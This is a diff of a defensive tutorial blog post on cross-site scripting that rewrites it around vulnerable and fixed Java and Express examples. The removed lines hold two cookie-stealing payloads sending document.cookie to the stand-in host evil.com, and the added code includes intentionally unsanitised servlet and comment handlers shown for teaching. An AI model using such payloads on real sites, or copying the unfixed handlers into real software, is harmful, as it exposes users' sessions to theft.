@@ -1,119 +1,178 @@
 ---
 layout: ../../../layouts/PostLayout.astro
 title: "Cross-Site Scripting (XSS): The Classic That Never Gets Old"
-description: "Understand what XSS is, how it works in practice, its real-world impact, and how to write code that isn't vulnerable to this type of attack."
+description: "Understand what XSS is, how it works in practice, its real-world impact, and how to write code that is not vulnerable to this type of attack."
 date: "2024-06-10"
 category: "Vulnerabilities"
 lang: "en-US"
 ---
 
-## What is XSS?
+# Cross-Site Scripting (XSS)
 
-**Cross-Site Scripting (XSS)** is a class of vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. Despite having "Cross-Site" in its name, the essence of the attack is the *injection of JavaScript code* into contexts where the application should be displaying only data.
+Imagine you're browsing a shopping website and someone left a comment on a product page. The comment was submitted through a text field on the site itself. Without you noticing, sensitive information stored in your browser was sent to an unknown server. This happened because the comment contained malicious code that the browser interpreted as a regular JavaScript script.
 
-XSS occurs when a web application:
+This type of attack is called Cross-Site Scripting, or XSS, and it can be used to steal sensitive information — such as tokens, passwords, and cookies — or even to alter the behavior of a site, redirecting users to fake pages.
 
-1. Receives data from an untrusted source (URL parameter, form input, cookie, etc.)
-2. Includes that data in the HTML response **without proper sanitization**
-3. The victim's browser interprets and executes the injected code
+This vulnerability exists because the site fails to properly validate user-supplied data. Instead of displaying the comment as plain text, the site ends up executing the malicious code embedded in it. XSS can enable many dangerous actions: theft of personal data, malware propagation, and even large-scale attacks such as phishing.
 
----
+## How Does It Work?
 
-## Main Types
+1. **Malicious Input:** The attacker injects malicious code into an input field or URL of a vulnerable application.
+2. **Browser Execution:** The malicious code is delivered to other users' browsers as part of the web page.
+3. **Impact:**
+    - Theft of cookies, session tokens, or sensitive data.
+    - Redirection to malicious sites.
+    - Modification of the page's interface or content.
 
-### Reflected XSS
+## Types of XSS
 
-The payload is sent via an HTTP request and immediately reflected back in the response. The victim must be tricked into clicking a malicious link.
+1. **Reflected:** The malicious script is sent in the request and reflected directly in the response without validation.
+2. **Stored:** The script is stored on the server (e.g., in a database) and executed every time the page is loaded.
+3. **DOM-Based:** The script is executed entirely on the client side by manipulating the Document Object Model (DOM).
 
-```
-https://target.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
-```
+## Prevention
 
-### Stored XSS
+1. **Sanitization and Validation:** Restrict and clean user input.
+2. **Output Escaping:** Convert special characters into HTML entities.
+3. **Use Safe APIs:** Avoid unsafe APIs like `innerHTML` and prefer alternatives like `textContent`.
 
-The payload is stored in the server's database (comment, profile, message) and displayed to other users. This is the most dangerous type: without requiring a special link, any visit to the page executes the code.
+**XSS is one of the most common web vulnerabilities recognized by the [OWASP](https://owasp.org/www-community/attacks/xss/) community and is included in the Injection category (A03) of the [OWASP Top 10 (2021)](https://owasp.org/Top10/A03_2021-Injection/).**
 
-### DOM-based XSS
+## Examples of Flaws and Fixes in Different Languages
 
-The vulnerability exists in the client-side JavaScript itself. The DOM is manipulated without the payload passing through the server — attacks that bypass WAFs configured only on the server side.
+### Reflected XSS Flaw in Java
 
----
+Consider a web application that includes user data directly in the response without validation or sanitization.
 
-## Conceptual Example
+```java
+// Java controller using Servlets
+import javax.servlet.http.*;
 
-Imagine a search field that displays the searched string:
+public class XSSExample extends HttpServlet {
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+        String name = request.getParameter("name");
+        response.setContentType("text/html");
+        response.getWriter().println("<h1>Hello, " + name + "!</h1>");
+    }
+}
 
-```html
-<!-- Vulnerable code -->
-<p>You searched for: <?= $_GET['q'] ?></p>
-```
-
-A malicious user accesses:
-
-```
-/search?q=<img src=x onerror="fetch('https://evil.com/?s='+document.cookie)">
-```
-
-The result rendered in the victim's HTML will be an invalid image that, upon failing to load, executes the code — silently exfiltrating session cookies.
-
----
-
-## Real-World Impact
-
-XSS is not just "displaying an alert() on screen." With JavaScript executing in the context of the target origin, an attacker can:
-
-- **Steal sessions**: capture cookies and authentication tokens
-- **Keylogging**: record everything the user types on the page
-- **Defacement**: alter the visual content of the page in real time
-- **Redirection**: send the victim to phishing pages
-- **Chained CSRF**: perform authenticated requests on behalf of the victim
-- **Data exfiltration**: read DOM content and send it to an external server
-
-> In financial, medical, or government applications, a stored XSS vulnerability can compromise hundreds of thousands of users simultaneously.
-
----
-
-## How to Prevent
-
-Effective prevention requires defense in depth:
-
-**1. Contextual output encoding**
-
-Encode data before inserting it into HTML. Use the correct function for each context:
-
-- HTML body → `htmlspecialchars()` (PHP) / `escapeHtml()`
-- HTML attribute → `htmlspecialchars($val, ENT_QUOTES)`
-- JavaScript → `JSON.encode()` or dedicated escape functions
-- URL → `urlencode()`
-
-**2. Content Security Policy (CSP)**
-
-Implement a restrictive CSP via HTTP header to limit allowed script origins:
-
-```
-Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}';
+// If the attacker sends name=<script>alert('XSS')</script>, the browser will execute the malicious script.
 ```
 
-**3. Cookie Flags**
+### Possible Fixes
 
-Protect session cookies with `HttpOnly` (inaccessible via JS) and `Secure` (HTTPS only):
+1. **Sanitize Output:** Use libraries like [OWASP Java Encoder](https://owasp.org/www-project-java-encoder/):
 
+```java
+import org.owasp.encoder.Encode;
+
+public class SecureXSSExample extends HttpServlet {
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+        String name = request.getParameter("name");
+        response.setContentType("text/html");
+        response.getWriter().println("<h1>Hello, " + Encode.forHtml(name) + "!</h1>");
+    }
+}
 ```
-Set-Cookie: sessid=abc123; HttpOnly; Secure; SameSite=Strict
+
+2. **Validate Input** using Regex or libraries like Hibernate Validator to accept only valid values.
+
+```java
+if (!name.matches("[a-zA-Z0-9 ]+")) {
+    throw new IllegalArgumentException("Invalid name");
+}
 ```
 
-**4. Input validation**
+## JavaScript Examples
 
-Validate and reject inputs that don't match the expected format. Whitelist is preferable to blacklist.
+Consider a system where comments are saved and displayed without sanitization.
 
-**5. Modern frameworks**
+Backend code:
 
-React, Vue, and Angular perform automatic encoding by default. Never use `dangerouslySetInnerHTML`, `v-html`, or `innerHTML` with untrusted data.
+```js
+const express = require('express');
+const app = express();
 
----
+let comments = [];
 
-## Further Reading
+app.use(express.urlencoded({ extended: true }));
 
-- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-- [PortSwigger Web Security Academy — XSS](https://portswigger.net/web-security/cross-site-scripting)
-- CWE-79: Improper Neutralization of Input During Web Page Generation
+app.post('/comment', (req, res) => {
+    comments.push(req.body.comment); // Stored without sanitization
+    res.send("Comment added!");
+});
+
+app.get('/comments', (req, res) => {
+    res.send(`
+        <h1>Comments:</h1>
+        ${comments.map(c => `<p>${c}</p>`).join('')}
+    `);
+});
+
+// An attacker can submit a comment like <script>alert('XSS')</script>,
+// which will execute for every user who visits the page.
+```
+
+### Fix in JavaScript
+
+1. **Sanitize Output** using libraries like DOMPurify to clean data before rendering.
+
+```js
+const DOMPurify = require('dompurify');
+const { JSDOM } = require('jsdom');
+
+const window = new JSDOM('').window;
+const purify = DOMPurify(window);
+
+app.get('/comments', (req, res) => {
+    res.send(`
+        <h1>Comments:</h1>
+        ${comments.map(c => `<p>${purify.sanitize(c)}</p>`).join('')}
+    `);
+});
+```
+
+2. **Manual Escaping:** Convert dangerous characters into HTML entities.
+
+```js
+function escapeHtml(str) {
+    return str
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+}
+
+app.get('/comments', (req, res) => {
+    res.send(`
+        <h1>Comments:</h1>
+        ${comments.map(c => `<p>${escapeHtml(c)}</p>`).join('')}
+    `);
+});
+```
+
+3. **Use Safe Templating Libraries:** Frameworks like React or Angular automatically escape content, preventing XSS:
+
+```js
+const CommentList = ({ comments }) => (
+    <div>
+        {comments.map((comment, index) => (
+            <p key={index}>{comment}</p> // React escapes automatically
+        ))}
+    </div>
+);
+```
+
+## General Best Practices
+
+- **Never trust user input:** Always validate and sanitize.
+- **Escape data when rendering:** Use language- or framework-specific tools.
+- **Use trusted libraries:**
+    - Java: OWASP Java Encoder.
+    - JavaScript: DOMPurify or modern frameworks like React, Angular, and Vue.js.
+- **Be careful with DOM APIs:** Manipulations like **innerHTML** are dangerous. Prefer safe APIs like **textContent**:
+
+```js
+element.textContent = userInput;
+```
